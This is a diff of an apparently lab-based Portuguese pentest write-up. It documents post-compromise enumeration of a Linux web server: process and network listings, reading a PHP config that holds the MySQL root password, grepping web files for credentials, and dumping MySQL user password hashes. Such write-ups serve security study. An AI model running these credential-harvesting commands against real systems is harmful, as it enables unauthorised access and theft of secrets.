@@ -35,148 +35,12 @@
   sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
   business:x:1000:1000:business,,,:/home/business:/bin/bash
 ```
-## comando : cat /var/www/html/prog/db.php
-```ruby
-  <!--?php
-  
-      $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
-      $db = mysql_select_db('deseclfi', $lnk);
-  
-  ?--> 
-
-
-```
-# CREDENCIAIS DO BANCO DE DADOS encontradas ( ROOT ) do mysql
 
 ## comando : ps aux
 
 ``` ruby
   USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
   root         1  0.0  0.8  33480  4048 ?        Ss   06:28   0:01 /sbin/init
-  root         2  0.0  0.0      0     0 ?        S    06:28   0:00 [kthreadd]
-  root         3  0.0  0.0      0     0 ?        S    06:28   0:01 [ksoftirqd/0]
-  root         5  0.0  0.0      0     0 ?        S<   06:28   0:00 [kworker/0:0H]
-  root         7  0.0  0.0      0     0 ?        S    06:28   0:05 [rcu_sched]
-  root         8  0.0  0.0      0     0 ?        S    06:28   0:00 [rcu_bh]
-  root         9  0.0  0.0      0     0 ?        S    06:28   0:00 [migration/0]
-  root        10  0.0  0.0      0     0 ?        S    06:28   0:00 [watchdog/0]
-  root        11  0.0  0.0      0     0 ?        S    06:28   0:00 [kdevtmpfs]
-  root        12  0.0  0.0      0     0 ?        S<   06:28   0:00 [netns]
-  root        13  0.0  0.0      0     0 ?        S<   06:28   0:00 [perf]
-  root        14  0.0  0.0      0     0 ?        S    06:28   0:00 [khungtaskd]
-  root        15  0.0  0.0      0     0 ?        S<   06:28   0:00 [writeback]
-  root        16  0.0  0.0      0     0 ?        SN   06:28   0:00 [ksmd]
-  root        17  0.0  0.0      0     0 ?        S<   06:28   0:00 [crypto]
-  root        18  0.0  0.0      0     0 ?        S<   06:28   0:00 [kintegrityd]
-  root        19  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        20  0.0  0.0      0     0 ?        S<   06:28   0:00 [kblockd]
-  root        21  0.0  0.0      0     0 ?        S<   06:28   0:00 [ata_sff]
-  root        22  0.0  0.0      0     0 ?        S<   06:28   0:00 [md]
-  root        23  0.0  0.0      0     0 ?        S<   06:28   0:00 [devfreq_wq]
-  root        25  0.0  0.0      0     0 ?        S    06:28   0:00 [kworker/0:1]
-  root        27  0.0  0.0      0     0 ?        S    06:28   0:00 [kswapd0]
-  root        28  0.0  0.0      0     0 ?        S<   06:28   0:00 [vmstat]
-  root        29  0.0  0.0      0     0 ?        S    06:28   0:00 [fsnotify_mark]
-  root        30  0.0  0.0      0     0 ?        S    06:28   0:00 [ecryptfs-kthrea]
-  root        46  0.0  0.0      0     0 ?        S<   06:28   0:00 [kthrotld]
-  root        47  0.0  0.0      0     0 ?        S<   06:28   0:00 [acpi_thermal_pm]
-  root        48  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        49  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        50  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        51  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        52  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        53  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        54  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        55  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        56  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        57  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        58  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        59  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        60  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        61  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        62  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        63  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        64  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        65  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        66  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        67  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        68  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        69  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        70  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        71  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
-  root        72  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_0]
-  root        73  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_0]
-  root        74  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_1]
-  root        75  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_1]
-  root        81  0.0  0.0      0     0 ?        S<   06:28   0:00 [ipv6_addrconf]
-  root        94  0.0  0.0      0     0 ?        S<   06:28   0:00 [deferwq]
-  root        95  0.0  0.0      0     0 ?        S<   06:28   0:00 [charger_manager]
-  root       150  0.0  0.0      0     0 ?        S    06:28   0:00 [kworker/0:2]
-  root       151  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_2]
-  root       152  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_2]
-  root       153  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_3]
-  root       154  0.0  0.0      0     0 ?        S<   06:28   0:00 [mpt_poll_0]
-  root       155  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_3]
-  root       156  0.0  0.0      0     0 ?        S<   06:28   0:00 [kpsmoused]
-  root       157  0.0  0.0      0     0 ?        S<   06:28   0:00 [mpt/0]
-  root       158  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_4]
-  root       159  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_4]
-  root       160  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_5]
-  root       161  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_5]
-  root       162  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_6]
-  root       163  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_6]
-  root       164  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_7]
-  root       165  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_7]
-  root       166  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_8]
-  root       167  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_8]
-  root       168  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_9]
-  root       171  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_9]
-  root       172  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_10]
-  root       173  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_10]
-  root       174  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_11]
-  root       175  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_11]
-  root       176  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_12]
-  root       177  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_12]
-  root       178  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_13]
-  root       179  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_13]
-  root       180  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_14]
-  root       181  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_14]
-  root       182  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_15]
-  root       183  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_15]
-  root       184  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_16]
-  root       185  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_16]
-  root       186  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_17]
-  root       187  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_17]
-  root       188  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_18]
-  root       189  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_18]
-  root       190  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_19]
-  root       191  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_19]
-  root       192  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_20]
-  root       193  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_20]
-  root       194  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_21]
-  root       195  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_21]
-  root       196  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_22]
-  root       197  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_22]
-  root       198  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_23]
-  root       199  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_23]
-  root       200  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_24]
-  root       201  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_24]
-  root       202  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_25]
-  root       203  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_25]
-  root       204  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_26]
-  root       205  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_26]
-  root       206  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_27]
-  root       207  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_27]
-  root       208  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_28]
-  root       209  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_28]
-  root       210  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_29]
-  root       211  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_29]
-  root       212  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_30]
-  root       213  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_30]
-  root       214  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_31]
-  root       215  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_31]
-  root       243  0.0  0.0      0     0 ?        S    06:28   0:00 [scsi_eh_32]
-  root       244  0.0  0.0      0     0 ?        S<   06:28   0:00 [scsi_tmf_32]
   root       245  0.0  0.0      0     0 ?        S<   06:28   0:00 [bioset]
   root       270  0.0  0.0      0     0 ?        S    06:28   0:01 [jbd2/sda1-8]
   root       271  0.0  0.0      0     0 ?        S<   06:28   0:00 [ext4-rsv-conver]
@@ -227,6 +91,27 @@
   tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
   tcp6       0      0 :::80                   :::*                    LISTEN      -               
 ```
+
+## comando : mysql -u root -pdbhacklfi -e "use mysql; select user, host, password from user;"
+```ruby
+  user	host	password
+  root	localhost	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	rh	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	127.0.0.1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	::1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  debian-sys-maint	localhost	*300DD417C72920F12EBD3A01236771655230AC5A
+```
+## comando : cat /var/www/html/prog/db.php
+```ruby
+  <!--?php
+  
+      $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
+      $db = mysql_select_db('deseclfi', $lnk);
+  
+  ?--> 
+
+```
+# CREDENCIAIS DO BANCO DE DADOS encontradas ( ROOT ) do mysql
 
 ## comando : cat /var/www/html/BANCO\ DE\ DADOS/bd.sql
 ```ruby
@@ -295,6 +180,7 @@
   /var/www/html/submit.php
   /var/www/html/login.php
 ```
+
 ## comando : grep -r "password\|user\|mysql" /var/www/html --include="*.php"
 
 <img width="886" height="701" alt="image" src="https://github.com/user-attachments/assets/1fab406b-967f-459d-b9e1-78572f951425" />
@@ -378,15 +264,3 @@ mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.
   user
 
 ```
-
-
-## comando : mysql -u root -pdbhacklfi -e "use mysql; select user, host, password from user;"
-```ruby
-  user	host	password
-  root	localhost	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
-  root	rh	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
-  root	127.0.0.1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
-  root	::1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
-  debian-sys-maint	localhost	*300DD417C72920F12EBD3A01236771655230AC5A
-```
-
